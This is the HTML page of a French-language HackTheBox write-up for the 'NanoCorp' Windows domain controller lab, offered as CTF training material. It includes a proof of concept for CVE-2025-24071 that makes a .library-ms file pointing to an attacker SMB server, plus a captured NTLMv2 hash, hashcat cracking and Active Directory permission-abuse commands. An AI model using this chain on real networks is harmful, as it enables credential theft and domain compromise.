@@ -1,0 +1,2162 @@
+<!DOCTYPE html>
+<html lang="en" dir="auto">
+
+<head><meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="robots" content="index, follow">
+<title>NanoCorp - HackTheBox Writeup | keyll0ger</title>
+<meta name="keywords" content="HTB, Linux, Medium">
+<meta name="description" content="📋 Résumé Exécutif Machine : Nanocorp (10.10.11.93)
+OS : Windows Server 2022 (Domain Controller)
+Domaine : nanocorp.htb / dc01.nanocorp.htb
+Difficulté : Hard
+Points Clés : CVE-2025-24071 (.library-ms NTLM Leak), IT_Support Group Abuse, ForceChangePassword Permission, WinRM Restrictions Bypass
+🔗 Chaîne d&rsquo;Attaque Complète Port 80 - Apache/PHP Web Server ↓ [CVE-2025-24071 - Malicious .library-ms in ZIP] Responder capture (port 445) ↓ [NTLMv2 hash capture] web_svc hash → Hashcat crack ↓ [web_svc:dksehdgh712!@#] LDAP/AD Enumeration ↓ [Découverte groupe IT_Support &#43; monitoring_svc] bloodyAD - Add web_svc to IT_Support ↓ [GenericAll permission sur monitoring_svc] bloodyAD - Change password monitoring_svc ↓ [monitoring_svc:PassW0rd!">
+<meta name="author" content="keyll0ger">
+<link rel="canonical" href="https://keyll0ger.github.io/posts/nanocorp/">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.fc220c15db4aef0318bbf30adc45d33d4d7c88deff3238b23eb255afdc472ca6.css" integrity="sha256-/CIMFdtK7wMYu/MK3EXTPU18iN7/MjiyPrJVr9xHLKY=" rel="preload stylesheet" as="style">
+<link rel="icon" href="https://keyll0ger.github.io/favicon.ico">
+<link rel="icon" type="image/png" sizes="16x16" href="https://keyll0ger.github.io/favicon-16x16.png">
+<link rel="icon" type="image/png" sizes="32x32" href="https://keyll0ger.github.io/favicon-32x32.png">
+<link rel="apple-touch-icon" href="https://keyll0ger.github.io/apple-touch-icon.png">
+<link rel="mask-icon" href="https://keyll0ger.github.io/safari-pinned-tab.svg">
+<meta name="theme-color" content="#2e2e33">
+<meta name="msapplication-TileColor" content="#2e2e33">
+<link rel="alternate" hreflang="en" href="https://keyll0ger.github.io/posts/nanocorp/">
+<noscript>
+    <style>
+        #theme-toggle,
+        .top-link {
+            display: none;
+        }
+
+    </style>
+</noscript>
+  
+
+<meta property="og:title" content="NanoCorp - HackTheBox Writeup" />
+<meta property="og:description" content="📋 Résumé Exécutif Machine : Nanocorp (10.10.11.93)
+OS : Windows Server 2022 (Domain Controller)
+Domaine : nanocorp.htb / dc01.nanocorp.htb
+Difficulté : Hard
+Points Clés : CVE-2025-24071 (.library-ms NTLM Leak), IT_Support Group Abuse, ForceChangePassword Permission, WinRM Restrictions Bypass
+🔗 Chaîne d&rsquo;Attaque Complète Port 80 - Apache/PHP Web Server ↓ [CVE-2025-24071 - Malicious .library-ms in ZIP] Responder capture (port 445) ↓ [NTLMv2 hash capture] web_svc hash → Hashcat crack ↓ [web_svc:dksehdgh712!@#] LDAP/AD Enumeration ↓ [Découverte groupe IT_Support &#43; monitoring_svc] bloodyAD - Add web_svc to IT_Support ↓ [GenericAll permission sur monitoring_svc] bloodyAD - Change password monitoring_svc ↓ [monitoring_svc:PassW0rd!" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="https://keyll0ger.github.io/posts/nanocorp/" /><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2026-03-27T00:00:00+00:00" />
+<meta property="article:modified_time" content="2026-03-27T00:00:00+00:00" />
+
+<meta name="twitter:card" content="summary"/>
+<meta name="twitter:title" content="NanoCorp - HackTheBox Writeup"/>
+<meta name="twitter:description" content="📋 Résumé Exécutif Machine : Nanocorp (10.10.11.93)
+OS : Windows Server 2022 (Domain Controller)
+Domaine : nanocorp.htb / dc01.nanocorp.htb
+Difficulté : Hard
+Points Clés : CVE-2025-24071 (.library-ms NTLM Leak), IT_Support Group Abuse, ForceChangePassword Permission, WinRM Restrictions Bypass
+🔗 Chaîne d&rsquo;Attaque Complète Port 80 - Apache/PHP Web Server ↓ [CVE-2025-24071 - Malicious .library-ms in ZIP] Responder capture (port 445) ↓ [NTLMv2 hash capture] web_svc hash → Hashcat crack ↓ [web_svc:dksehdgh712!@#] LDAP/AD Enumeration ↓ [Découverte groupe IT_Support &#43; monitoring_svc] bloodyAD - Add web_svc to IT_Support ↓ [GenericAll permission sur monitoring_svc] bloodyAD - Change password monitoring_svc ↓ [monitoring_svc:PassW0rd!"/>
+
+
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BreadcrumbList",
+  "itemListElement": [
+    {
+      "@type": "ListItem",
+      "position":  1 ,
+      "name": "Posts",
+      "item": "https://keyll0ger.github.io/posts/"
+    }, 
+    {
+      "@type": "ListItem",
+      "position":  2 ,
+      "name": "NanoCorp - HackTheBox Writeup",
+      "item": "https://keyll0ger.github.io/posts/nanocorp/"
+    }
+  ]
+}
+</script>
+<script type="application/ld+json">
+{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "NanoCorp - HackTheBox Writeup",
+  "name": "NanoCorp - HackTheBox Writeup",
+  "description": "📋 Résumé Exécutif Machine : Nanocorp (10.10.11.93)\nOS : Windows Server 2022 (Domain Controller)\nDomaine : nanocorp.htb / dc01.nanocorp.htb\nDifficulté : Hard\nPoints Clés : CVE-2025-24071 (.library-ms NTLM Leak), IT_Support Group Abuse, ForceChangePassword Permission, WinRM Restrictions Bypass\n🔗 Chaîne d\u0026rsquo;Attaque Complète Port 80 - Apache/PHP Web Server ↓ [CVE-2025-24071 - Malicious .library-ms in ZIP] Responder capture (port 445) ↓ [NTLMv2 hash capture] web_svc hash → Hashcat crack ↓ [web_svc:dksehdgh712!@#] LDAP/AD Enumeration ↓ [Découverte groupe IT_Support + monitoring_svc] bloodyAD - Add web_svc to IT_Support ↓ [GenericAll permission sur monitoring_svc] bloodyAD - Change password monitoring_svc ↓ [monitoring_svc:PassW0rd!",
+  "keywords": [
+    "HTB", "Linux", "Medium"
+  ],
+  "articleBody": "📋 Résumé Exécutif Machine : Nanocorp (10.10.11.93)\nOS : Windows Server 2022 (Domain Controller)\nDomaine : nanocorp.htb / dc01.nanocorp.htb\nDifficulté : Hard\nPoints Clés : CVE-2025-24071 (.library-ms NTLM Leak), IT_Support Group Abuse, ForceChangePassword Permission, WinRM Restrictions Bypass\n🔗 Chaîne d’Attaque Complète Port 80 - Apache/PHP Web Server ↓ [CVE-2025-24071 - Malicious .library-ms in ZIP] Responder capture (port 445) ↓ [NTLMv2 hash capture] web_svc hash → Hashcat crack ↓ [web_svc:dksehdgh712!@#] LDAP/AD Enumeration ↓ [Découverte groupe IT_Support + monitoring_svc] bloodyAD - Add web_svc to IT_Support ↓ [GenericAll permission sur monitoring_svc] bloodyAD - Change password monitoring_svc ↓ [monitoring_svc:PassW0rd!2025] Evil-WinRM bloqué ❌ ↓ [Restrictions réseau ou GPO] winrmexec - Bypass restrictions ↓ [Alternative RPC execution method] Remote Code Execution (monitoring_svc) ↓ [Shell ou command execution] Privilege Escalation ↓ SYSTEM/Administrator access → Flags 1️⃣ RECONNAISSANCE 🔍 Scan Nmap # Scan rapide des ports nmap -p- --min-rate 10000 10.10.11.93 -vv # Scan détaillé nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,5986,9389 -sCV -A 10.10.11.93 -oN nmap.txt Résultats :\nPort Service Version Rôle 53 DNS Simple DNS Plus Résolution de noms 80 HTTP Apache 2.4.58 (OpenSSL/3.1.3 PHP/8.2.12) Web server (inhabituel sur DC) 88 Kerberos Microsoft Windows Kerberos Authentification AD 135 MSRPC Microsoft Windows RPC Communication RPC 139 NetBIOS-SSN Microsoft Windows netbios-ssn Partage fichiers (legacy) 389 LDAP Microsoft AD LDAP Annuaire Active Directory 445 SMB Microsoft-DS Partage fichiers moderne 464 kpasswd5 - Changement mot de passe Kerberos 593 HTTP-RPC Microsoft Windows RPC over HTTP RPC via HTTP 636 LDAPS tcpwrapped LDAP sécurisé (SSL/TLS) 3268 Global Catalog Microsoft AD LDAP Catalogue global AD 3269 GC-SSL tcpwrapped Catalogue global sécurisé 5986 WinRM-SSL Microsoft HTTPAPI 2.0 PowerShell Remoting (HTTPS) 9389 MC-NMF .NET Message Framing AD Web Services Identification :\nDomaine : nanocorp.htb Hostname : dc01.nanocorp.htb Rôle : Domain Controller Windows Server 2022 Particularité : Apache + PHP sur port 80 (très inhabituel pour un DC !) ⏰ Décalage Horaire : -1 seconde (clock-skew: -1s)\n✅ Bon Point : Décalage horaire négligeable, pas de problème Kerberos prévu.\n🔍 Observations Critiques :\nApache sur un DC Windows = Configuration non standard\nPotentiellement une application web custom Vecteur d’attaque probable SMBv2/v3 avec signature obligatoire\nMessage signing enabled and required Limite les attaques SMB relay classiques WinRM sur port 5986 (HTTPS uniquement)\nPas de port 5985 (HTTP) Certificat: dc01.nanocorp.htb ⚠️ Potentiellement restreint par GPO/Firewall 📝 Configuration /etc/hosts echo \"10.10.11.93 dc01.nanocorp.htb nanocorp.htb\" | sudo tee -a /etc/hosts 2️⃣ ÉNUMÉRATION WEB \u0026 SMB 🌐 Service HTTP - Port 80 Redirection automatique :\nfirefox http://10.10.11.93 # Redirige vers: http://nanocorp.htb/ 🎯 Page d’accueil :\nNanoCorp - Corporate Solutions =============================== [Home] [About] [Services] [Contact] Enterprise-grade technology solutions 🔎 Directory Enumeration dirb http://nanocorp.htb Résultats intéressants :\nPath Code Description /css/ 200 Directory listable /img/ 200 Directory listable /js/ 200 Directory listable /index.html 200 Page principale /phpmyadmin 403 Forbidden (existe mais inaccessible) /examples 503 Service Unavailable 💡 Découverte :\nSite statique sans fonctionnalité apparente Pas de formulaires, pas d’upload Aucun vecteur d’attaque évident côté web 📂 Énumération SMB smbclient -L //10.10.11.93/ -N Résultat :\nAnonymous login successful Sharename Type Comment --------- ---- ------- Reconnecting with SMB1 for workgroup listing. do_connect: Connection to 10.10.11.93 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND) Unable to connect with SMB1 -- no workgroup available 🔍 Analyse :\nAnonymous login successful = Connexion null session autorisée Mais aucun partage visible en anonymous SMBv1 désactivé (bonne pratique de sécurité) 💡 Impasse : SMB ne donne pas d’accès initial sans credentials.\n3️⃣ EXPLOITATION - CVE-2025-24071 🎓 Qu’est-ce que CVE-2025-24071 ? CVE-2025-24071 est une vulnérabilité de Windows File Explorer qui permet la divulgation de hash NTLM via des fichiers .library-ms malveillants.\nFonctionnement :\nFichier .library-ms = Format XML de “bibliothèque” Windows\nPointe vers un emplacement de fichiers (local ou réseau) Exemple légitime : “Mes Documents”, “Mes Images” Exploitation :\nCréer un fichier .library-ms pointant vers \\\\ATTACKER_IP\\share Compresser dans un fichier ZIP Lorsque la victime extrait le ZIP → Windows Explorer tente automatiquement de se connecter au partage SMB Authentification NTLM automatique = Hash NTLM envoyé à l’attaquant ! Conditions requises :\nVictime doit extraire le fichier ZIP Aucune interaction supplémentaire nécessaire Fonctionne sur Windows 10/11 Schéma d’attaque :\n[Attaquant] [Victime Windows] | | | 1. Créer malicious.library-ms | | (pointe vers \\\\10.10.16.3\\share) | | | 2. Compresser en ZIP | |--------------------------------\u003e| 3. Victime extrait ZIP | | | | 4. Windows Explorer lit .library-ms | | | | 5. Tentative connexion SMB | | \\\\10.10.16.3\\share | 6. NTLM Authentication Request | |\u003c--------------------------------| | | | 7. Hash NTLMv2 capturé ! | 🛠️ Préparation du Payload Script d’exploitation (CVE-2025-24071) :\ncat PoC.py Code du POC :\n#!/usr/bin/env python3 # CVE-2025-24071 - Windows .library-ms NTLM Hash Disclosure import zipfile from pathlib import Path import argparse def create_library_ms(ip: str, filename: str, output_dir: Path) -\u003e Path: \"\"\"Creates a malicious .library-ms file pointing to an attacker's SMB server.\"\"\" payload = f'''\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \\\\\\\\{ip}\\\\shared ''' output_file = output_dir / f\"{filename}.library-ms\" output_file.write_text(payload, encoding=\"utf-8\") return output_file def build_zip(library_file: Path, output_zip: Path): \"\"\"Packages the .library-ms file into a ZIP archive.\"\"\" with zipfile.ZipFile(output_zip, 'w', zipfile.ZIP_DEFLATED) as archive: archive.write(library_file, arcname=library_file.name) print(f\"[+] Created ZIP: {output_zip}\") Génération du payload :\npython3 PoC.py -i 10.10.16.3 -n keyll0ger Sortie :\n[*] Generating malicious .library-ms file... [+] Created ZIP: output/keyll0ger.zip [-] Removed intermediate .library-ms file [!] Done. Send ZIP to victim and listen for NTLM hash on your SMB server. Fichier généré : output/keyll0ger.zip\nContenu du ZIP (keyll0ger.library-ms) :\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e \\\\10.10.16.3\\shared ⬅️ SMB vers notre IP 🎣 Préparation du Listener Lancement de Responder :\nsudo responder -I tun0 Responder démarre les services :\n[+] Servers: HTTP server [ON] HTTPS server [ON] SMB server [ON] ⬅️ Capture NTLM Kerberos server [ON] LDAP server [ON] ... [+] Generic Options: Responder NIC [tun0] Responder IP [10.10.16.3] [+] Listening for events... 🎉 Capture du Hash NTLMv2 Responder capture :\n[SMB] NTLMv2-SSP Client : 10.10.11.93 [SMB] NTLMv2-SSP Username : NANOCORP\\web_svc [SMB] NTLMv2-SSP Hash : web_svc::NANOCORP:8c2319b80be69c75:2CEC5022FB7FA0100030756D99A21F98:010100000000000080ED37A2FD6DDC01B8A778C400B3484E00000000020008004500410052004C0001001E00570049004E002D0046003400410056004C004F003400420052005000370004003400570049004E002D0046003400410056004C004F00340042005200500037002E004500410052004C002E004C004F00430041004C00030014004500410052004C002E004C004F00430041004C00050014004500410052004C002E004C004F00430041004C000700080080ED37A2FD6DDC0106000400020000000800300030000000000000000000000000200000A0912495769EE939AB4E8AC154F7DE18E5D4E880839219E9B6F5A2BD022580350A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310036002E0033000000000000000000 🎯 Informations Capturées :\nClient IP : 10.10.11.93 (DC01) Utilisateur : NANOCORP\\web_svc Hash Type : NTLMv2-SSP Hash complet : (voir ci-dessus) Sauvegarde du hash :\ncat \u003e web_svc.hash \u003c\u003c 'EOF' WEB_SVC::NANOCORP:8c2319b80be69c75:2cec5022fb7fa0100030756d99a21f98:010100000000000080ed37a2fd6ddc01b8a778c400b3484e00000000020008004500410052004c0001001e00570049004e002d0046003400410056004c004f003400420052005000370004003400570049004e002d0046003400410056004c004f00340042005200500037002e004500410052004c002e004c004f00430041004c00030014004500410052004c002e004c004f00430041004c00050014004500410052004c002e004c004f00430041004c000700080080ed37a2fd6ddc0106000400020000000800300030000000000000000000000000200000a0912495769ee939ab4e8ac154f7de18e5d4e880839219e9b6f5a2bd022580350a0010000000000000000000000000000000000009001e0063006900660073002f00310030002e00310030002e00310036002e0033000000000000000000 EOF 4️⃣ CRACKING DU HASH 🔨 Hashcat Identification du mode Hashcat :\nNTLMv2 = Mode 5600 Commande de cracking :\nhashcat -m 5600 web_svc.hash /usr/share/wordlists/rockyou.txt --force Résultat (instantané - 1 seconde) :\nhashcat (v7.1.2) starting Hash.Mode........: 5600 (NetNTLMv2) Hash.Target......: WEB_SVC::NANOCORP:8c2319b80be69c75:... WEB_SVC::NANOCORP:8c2319b80be69c75:...:dksehdgh712!@# Session..........: hashcat Status...........: Cracked Time.Started.....: Mon Dec 15 20:04:26 2025, (0 secs) Time.Estimated...: Mon Dec 15 20:04:26 2025, (0 secs) Speed.#01........: 6640.6 kH/s Progress.........: 1869824/14344385 (13.04%) Recovered........: 1/1 (100.00%) Digests 🔑 Credentials Obtenus :\nUsername: web_svc Password: dksehdgh712!@# 5️⃣ ÉNUMÉRATION AVEC web_svc 🔍 Test d’Accès Vérification SMB :\nnetexec smb 10.10.11.93 -u web_svc -p 'dksehdgh712!@#' --shares Résultat :\nSMB 10.10.11.93 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:nanocorp.htb) (signing:True) (SMBv1:False) SMB 10.10.11.93 445 DC01 [+] nanocorp.htb\\web_svc:dksehdgh712!@# SMB 10.10.11.93 445 DC01 [*] Enumerated shares SMB 10.10.11.93 445 DC01 Share Permissions Remark SMB 10.10.11.93 445 DC01 ----- ----------- ------ SMB 10.10.11.93 445 DC01 ADMIN$ Remote Admin SMB 10.10.11.93 445 DC01 C$ Default share SMB 10.10.11.93 445 DC01 IPC$ READ Remote IPC SMB 10.10.11.93 445 DC01 NETLOGON READ Logon server share SMB 10.10.11.93 445 DC01 SYSVOL READ Logon server share 💡 Observation :\n✅ Authentification réussie ✅ Accès en lecture à IPC$, NETLOGON, SYSVOL (standard) ❌ Pas d’accès aux partages admin (ADMIN$, C$) ❌ Pas de partages personnalisés intéressants 👥 Énumération des Utilisateurs netexec smb 10.10.11.93 -u web_svc -p 'dksehdgh712!@#' --users Résultat :\nSMB 10.10.11.93 445 DC01 -Username- -Last PW Set- -BadPW- -Description- SMB 10.10.11.93 445 DC01 Administrator 2025-04-09 23:00:49 0 Built-in account for administering the computer/domain SMB 10.10.11.93 445 DC01 Guest 0 Built-in account for guest access SMB 10.10.11.93 445 DC01 krbtgt 2025-04-03 01:38:45 0 Key Distribution Center Service Account SMB 10.10.11.93 445 DC01 web_svc 2025-04-09 22:59:38 0 SMB 10.10.11.93 445 DC01 monitoring_svc 2025-12-15 19:03:55 0 SMB 10.10.11.93 445 DC01 [*] Enumerated 5 local users: NANOCORP 🎯 Utilisateurs Identifiés :\nUsername Description Intérêt Administrator Compte admin domaine ⭐⭐⭐ Cible finale Guest Compte invité (désactivé) ❌ Pas utile krbtgt Service Kerberos ⭐ Pour Golden Ticket (post-exploitation) web_svc Notre compte actuel ✅ Compromis monitoring_svc Compte de service ⭐⭐ Cible potentielle 👥 Énumération des Groupes Via rpcclient :\nrpcclient -U 'NANOCORP\\web_svc%dksehdgh712!@#' 10.10.11.93 rpcclient $\u003e enumdomgroups group:[Enterprise Read-only Domain Controllers] rid:[0x1f2] group:[Domain Admins] rid:[0x200] group:[Domain Users] rid:[0x201] group:[Domain Guests] rid:[0x202] group:[Domain Computers] rid:[0x203] group:[Domain Controllers] rid:[0x204] group:[Schema Admins] rid:[0x206] group:[Enterprise Admins] rid:[0x207] group:[Group Policy Creator Owners] rid:[0x208] group:[Read-only Domain Controllers] rid:[0x209] group:[Cloneable Domain Controllers] rid:[0x20a] group:[Protected Users] rid:[0x20d] group:[Key Admins] rid:[0x20e] group:[Enterprise Key Admins] rid:[0x20f] group:[DnsUpdateProxy] rid:[0x44e] group:[IT_Support] rid:[0xc1e] ⬅️ ⭐ Groupe personnalisé ! 💡 Découverte Critique : Groupe IT_Support (RID: 0xc1e = 3102 en décimal)\nVérification du RID de web_svc :\nrpcclient $\u003e lookupnames web_svc web_svc S-1-5-21-2261381271-1331810270-697239744-1103 (User: 1) RID de web_svc : 1103 (0x44F en hexadécimal)\n6️⃣ ABUS DU GROUPE IT_SUPPORT 🎓 Hypothèse d’Exploitation Raisonnement :\nLe groupe IT_Support existe (non standard)\nLes groupes de support IT ont souvent des permissions élevées :\nRéinitialisation de mots de passe Modification d’attributs utilisateurs Accès aux comptes de service Objectif : Vérifier si IT_Support a des permissions sur monitoring_svc\n🔍 Énumération des Permissions Via bloodyAD (outil d’abus AD) :\nbloodyAD \\ --host dc01.nanocorp.htb \\ -d nanocorp.htb \\ -u web_svc \\ -p 'dksehdgh712!@#' \\ get writable Résultat :\ndistinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=nanocorp,DC=htb permission: WRITE distinguishedName: CN=web_svc,CN=Users,DC=nanocorp,DC=htb permission: WRITE 🔍 Analyse :\nweb_svc peut modifier son propre objet (normal) web_svc peut modifier S-1-5-11 (Authenticated Users - pas utile) Aucune mention de monitoring_svc ← On ne voit pas les permissions tant qu’on n’est pas dans le groupe ! 🎯 Ajout au Groupe IT_Support 🎓 Pourquoi ajouter web_svc à IT_Support ?\nSi web_svc a des permissions sur IT_Support (peut-être via Self-Membership ou une ACL mal configurée), il peut s’ajouter lui-même au groupe !\nTest via ldapmodify :\nldapmodify -x \\ -D \"NANOCORP\\\\web_svc\" \\ -w 'dksehdgh712!@#' \\ -H ldap://10.10.11.93 \u003c",
+  "wordCount" : "4295",
+  "inLanguage": "en",
+  "datePublished": "2026-03-27T00:00:00Z",
+  "dateModified": "2026-03-27T00:00:00Z",
+  "author":{
+    "@type": "Person",
+    "name": "keyll0ger"
+  },
+  "mainEntityOfPage": {
+    "@type": "WebPage",
+    "@id": "https://keyll0ger.github.io/posts/nanocorp/"
+  },
+  "publisher": {
+    "@type": "Organization",
+    "name": "keyll0ger",
+    "logo": {
+      "@type": "ImageObject",
+      "url": "https://keyll0ger.github.io/favicon.ico"
+    }
+  }
+}
+</script>
+</head>
+
+<body class=" dark" id="top">
+<script>
+    if (localStorage.getItem("pref-theme") === "light") {
+        document.body.classList.remove('dark')
+    }
+
+</script>
+
+<header class="header">
+    <nav class="nav">
+        <div class="logo">
+            <a href="https://keyll0ger.github.io/" accesskey="h" title="keyll0ger (Alt + H)">keyll0ger</a>
+            <div class="logo-switches">
+                <button id="theme-toggle" accesskey="t" title="(Alt + T)">
+                    <svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"></path>
+                    </svg>
+                    <svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24"
+                        fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"
+                        stroke-linejoin="round">
+                        <circle cx="12" cy="12" r="5"></circle>
+                        <line x1="12" y1="1" x2="12" y2="3"></line>
+                        <line x1="12" y1="21" x2="12" y2="23"></line>
+                        <line x1="4.22" y1="4.22" x2="5.64" y2="5.64"></line>
+                        <line x1="18.36" y1="18.36" x2="19.78" y2="19.78"></line>
+                        <line x1="1" y1="12" x2="3" y2="12"></line>
+                        <line x1="21" y1="12" x2="23" y2="12"></line>
+                        <line x1="4.22" y1="19.78" x2="5.64" y2="18.36"></line>
+                        <line x1="18.36" y1="5.64" x2="19.78" y2="4.22"></line>
+                    </svg>
+                </button>
+            </div>
+        </div>
+        <ul id="menu">
+            <li>
+                <a href="https://keyll0ger.github.io/posts/" title="Writeups">
+                    <span>Writeups</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/tags/" title="Tags">
+                    <span>Tags</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/search/" title="Search (Alt &#43; /)" accesskey=/>
+                    <span>Search</span>
+                </a>
+            </li>
+            <li>
+                <a href="https://keyll0ger.github.io/about/" title="About">
+                    <span>About</span>
+                </a>
+            </li>
+        </ul>
+    </nav>
+</header>
+<main class="main">
+
+<article class="post-single">
+  <header class="post-header">
+    <div class="breadcrumbs"><a href="https://keyll0ger.github.io/">Home</a>&nbsp;»&nbsp;<a href="https://keyll0ger.github.io/posts/">Posts</a></div>
+    <h1 class="post-title entry-hint-parent">
+      NanoCorp - HackTheBox Writeup
+    </h1>
+    <div class="post-meta"><span title='2026-03-27 00:00:00 +0000 UTC'>March 27, 2026</span>&nbsp;·&nbsp;21 min&nbsp;·&nbsp;keyll0ger
+
+</div>
+  </header> <div class="toc">
+    <details  open>
+        <summary accesskey="c" title="(Alt + C)">
+            <span class="details">Table of Contents</span>
+        </summary>
+
+        <div class="inner"><ul>
+                <li>
+                    <a href="#-r%c3%a9sum%c3%a9-ex%c3%a9cutif" aria-label="📋 Résumé Exécutif">📋 Résumé Exécutif</a><ul>
+                        
+                <li>
+                    <a href="#-cha%c3%aene-dattaque-compl%c3%a8te" aria-label="🔗 Chaîne d&rsquo;Attaque Complète">🔗 Chaîne d&rsquo;Attaque Complète</a></li></ul>
+                </li>
+                <li>
+                    <a href="#1-reconnaissance" aria-label="1️⃣ RECONNAISSANCE">1️⃣ RECONNAISSANCE</a><ul>
+                        
+                <li>
+                    <a href="#-scan-nmap" aria-label="🔍 Scan Nmap">🔍 Scan Nmap</a></li>
+                <li>
+                    <a href="#-configuration-etchosts" aria-label="📝 Configuration /etc/hosts">📝 Configuration /etc/hosts</a></li></ul>
+                </li>
+                <li>
+                    <a href="#2-%c3%a9num%c3%a9ration-web--smb" aria-label="2️⃣ ÉNUMÉRATION WEB &amp; SMB">2️⃣ ÉNUMÉRATION WEB &amp; SMB</a><ul>
+                        
+                <li>
+                    <a href="#-service-http---port-80" aria-label="🌐 Service HTTP - Port 80">🌐 Service HTTP - Port 80</a></li>
+                <li>
+                    <a href="#-directory-enumeration" aria-label="🔎 Directory Enumeration">🔎 Directory Enumeration</a></li>
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-smb" aria-label="📂 Énumération SMB">📂 Énumération SMB</a></li></ul>
+                </li>
+                <li>
+                    <a href="#3-exploitation---cve-2025-24071" aria-label="3️⃣ EXPLOITATION - CVE-2025-24071">3️⃣ EXPLOITATION - CVE-2025-24071</a><ul>
+                        
+                <li>
+                    <a href="#-quest-ce-que-cve-2025-24071-" aria-label="🎓 Qu&rsquo;est-ce que CVE-2025-24071 ?">🎓 Qu&rsquo;est-ce que CVE-2025-24071 ?</a></li>
+                <li>
+                    <a href="#-pr%c3%a9paration-du-payload" aria-label="🛠️ Préparation du Payload">🛠️ Préparation du Payload</a></li>
+                <li>
+                    <a href="#-pr%c3%a9paration-du-listener" aria-label="🎣 Préparation du Listener">🎣 Préparation du Listener</a></li>
+                <li>
+                    <a href="#-capture-du-hash-ntlmv2" aria-label="🎉 Capture du Hash NTLMv2">🎉 Capture du Hash NTLMv2</a></li></ul>
+                </li>
+                <li>
+                    <a href="#4-cracking-du-hash" aria-label="4️⃣ CRACKING DU HASH">4️⃣ CRACKING DU HASH</a><ul>
+                        
+                <li>
+                    <a href="#-hashcat" aria-label="🔨 Hashcat">🔨 Hashcat</a></li></ul>
+                </li>
+                <li>
+                    <a href="#5-%c3%a9num%c3%a9ration-avec-web_svc" aria-label="5️⃣ ÉNUMÉRATION AVEC web_svc">5️⃣ ÉNUMÉRATION AVEC web_svc</a><ul>
+                        
+                <li>
+                    <a href="#-test-dacc%c3%a8s" aria-label="🔍 Test d&rsquo;Accès">🔍 Test d&rsquo;Accès</a></li>
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-des-utilisateurs" aria-label="👥 Énumération des Utilisateurs">👥 Énumération des Utilisateurs</a></li>
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-des-groupes" aria-label="👥 Énumération des Groupes">👥 Énumération des Groupes</a></li></ul>
+                </li>
+                <li>
+                    <a href="#6-abus-du-groupe-it_support" aria-label="6️⃣ ABUS DU GROUPE IT_SUPPORT">6️⃣ ABUS DU GROUPE IT_SUPPORT</a><ul>
+                        
+                <li>
+                    <a href="#-hypoth%c3%a8se-dexploitation" aria-label="🎓 Hypothèse d&rsquo;Exploitation">🎓 Hypothèse d&rsquo;Exploitation</a></li>
+                <li>
+                    <a href="#-%c3%a9num%c3%a9ration-des-permissions" aria-label="🔍 Énumération des Permissions">🔍 Énumération des Permissions</a></li>
+                <li>
+                    <a href="#-ajout-au-groupe-it_support" aria-label="🎯 Ajout au Groupe IT_Support">🎯 Ajout au Groupe IT_Support</a></li>
+                <li>
+                    <a href="#-v%c3%a9rification-de-lajout" aria-label="✅ Vérification de l&rsquo;Ajout">✅ Vérification de l&rsquo;Ajout</a></li></ul>
+                </li>
+                <li>
+                    <a href="#7-changement-de-mot-de-passe---monitoring_svc" aria-label="7️⃣ CHANGEMENT DE MOT DE PASSE - monitoring_svc">7️⃣ CHANGEMENT DE MOT DE PASSE - monitoring_svc</a><ul>
+                        
+                <li>
+                    <a href="#-permissions-du-groupe-it_support" aria-label="🎓 Permissions du Groupe IT_Support">🎓 Permissions du Groupe IT_Support</a></li>
+                <li>
+                    <a href="#-contraintes-de-complexit%c3%a9" aria-label="🛡️ Contraintes de Complexité">🛡️ Contraintes de Complexité</a></li>
+                <li>
+                    <a href="#-changement-r%c3%a9ussi" aria-label="✅ Changement Réussi">✅ Changement Réussi</a></li></ul>
+                </li>
+                <li>
+                    <a href="#8-acc%c3%a8s-distant---bypass-winrm-restrictions" aria-label="8️⃣ ACCÈS DISTANT - BYPASS WINRM RESTRICTIONS">8️⃣ ACCÈS DISTANT - BYPASS WINRM RESTRICTIONS</a><ul>
+                        
+                <li>
+                    <a href="#-probl%c3%a8me--evil-winrm-bloqu%c3%a9" aria-label="❌ Problème : Evil-WinRM Bloqué">❌ Problème : Evil-WinRM Bloqué</a></li>
+                <li>
+                    <a href="#-quest-ce-que-winrmexec-" aria-label="🎓 Qu&rsquo;est-ce que winrmexec ?">🎓 Qu&rsquo;est-ce que winrmexec ?</a></li>
+                <li>
+                    <a href="#-installation-de-winrmexec" aria-label="🛠️ Installation de winrmexec">🛠️ Installation de winrmexec</a></li>
+                <li>
+                    <a href="#-synchronisation-horaire-kerberos" aria-label="⏰ Synchronisation Horaire (Kerberos)">⏰ Synchronisation Horaire (Kerberos)</a></li>
+                <li>
+                    <a href="#-obtention-dun-tgt-kerberos" aria-label="🎫 Obtention d&rsquo;un TGT Kerberos">🎫 Obtention d&rsquo;un TGT Kerberos</a></li>
+                <li>
+                    <a href="#-ex%c3%a9cution-de-commandes-avec-winrmexec" aria-label="🚀 Exécution de Commandes avec winrmexec">🚀 Exécution de Commandes avec winrmexec</a></li>
+                <li>
